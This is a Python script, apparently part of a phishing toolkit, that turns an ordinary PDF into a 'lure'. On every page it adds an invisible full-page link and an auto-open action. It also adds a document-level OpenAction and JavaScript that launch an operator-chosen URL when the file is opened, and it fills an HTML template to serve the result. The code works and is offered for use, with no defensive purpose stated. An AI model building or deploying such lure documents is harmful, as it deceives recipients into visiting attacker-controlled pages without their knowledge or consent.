#!/usr/bin/env python3

import os
import shutil
import utils

from colorama import init

init()
from colorama import Fore

R = Fore.RED
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
W = Fore.RESET

FILES_DIR = 'template/pdf/files'


def create_lure_pdf(source_path, output_path, link_url):
    """Build a PDF identical to the source with hidden links + auto-open URL."""
    from pypdf import PdfReader, PdfWriter
    from pypdf.generic import (
        ArrayObject,
        DictionaryObject,
        FloatObject,
        NameObject,
        NumberObject,
        TextStringObject,
    )

    link_url = link_url.rstrip('/')
    if not link_url.startswith('http://') and not link_url.startswith('https://'):
        link_url = 'https://' + link_url

    reader = PdfReader(source_path)
    writer = PdfWriter()
    writer.append_pages_from_reader(reader)

    for page in writer.pages:
        mediabox = page.mediabox
        width = float(mediabox.width)
        height = float(mediabox.height)

        link_annotation = DictionaryObject(
            {
                NameObject('/Type'): NameObject('/Annot'),
                NameObject('/Subtype'): NameObject('/Link'),
                NameObject('/Rect'): ArrayObject(
                    [
                        FloatObject(0),
                        FloatObject(0),
                        FloatObject(width),
                        FloatObject(height),
                    ]
                ),
                NameObject('/Border'): ArrayObject(
                    [NumberObject(0), NumberObject(0), NumberObject(0)]
                ),
                NameObject('/A'): DictionaryObject(
                    {
                        NameObject('/S'): NameObject('/URI'),
                        NameObject('/URI'): TextStringObject(link_url),
                    }
                ),
            }
        )

        if '/Annots' in page:
            page['/Annots'].append(link_annotation)
        else:
            page[NameObject('/Annots')] = ArrayObject([link_annotation])

        page[NameObject('/AA')] = DictionaryObject(
            {
                NameObject('/O'): DictionaryObject(
                    {
                        NameObject('/S'): NameObject('/URI'),
                        NameObject('/URI'): TextStringObject(link_url),
                    }
                )
            }
        )

    writer._root_object.update(
        {
            NameObject('/OpenAction'): DictionaryObject(
                {
                    NameObject('/S'): NameObject('/URI'),
                    NameObject('/URI'): TextStringObject(link_url),
                }
            )
        }
    )

    writer.add_js(f'app.launchURL("{link_url}", true);')
    writer.write(output_path)
    return output_path


PDF_PATH = os.getenv('PDF_PATH')
PDF_TITLE = os.getenv('PDF_TITLE')

if PDF_PATH is None:
    PDF_PATH = input(f'{G}[+] {C}Path to PDF file : {W}')
else:
    utils.print(f'{G}[+] {C}PDF file :{W} {PDF_PATH}')

if not os.path.isfile(PDF_PATH):
    utils.print(f'{R}[-] {C}PDF file not found : {W}{PDF_PATH}')
    exit()

if not PDF_PATH.lower().endswith('.pdf'):
    utils.print(f'{R}[-] {C}File must be a PDF (.pdf){W}')
    exit()

original_name = os.path.basename(PDF_PATH)

if PDF_TITLE is None:
    if os.getenv('PDF_AUTO'):
        PDF_TITLE = original_name
    else:
        PDF_TITLE = input(
            f'{G}[+] {C}Document title [{W}{original_name}{C}] : {W}'
        ).strip() or original_name
else:
    utils.print(f'{G}[+] {C}Document title :{W} {PDF_TITLE}')

os.makedirs(FILES_DIR, exist_ok=True)

dest_pdf = f'{FILES_DIR}/document.pdf'
try:
    shutil.copyfile(PDF_PATH, dest_pdf)
except Exception as exc:
    utils.print(f'{R}[-] {C}Exception : {W}{exc}')
    exit()

with open('template/pdf/index_temp.html', 'r', encoding='utf-8') as temp_index:
    code = temp_index.read()
    if os.getenv('DEBUG_HTTP'):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', PDF_TITLE)
    code = code.replace('$PDF_FILE$', 'files/document.pdf')

with open('template/pdf/index.html', 'w', encoding='utf-8') as updated_index:
    updated_index.write(code)
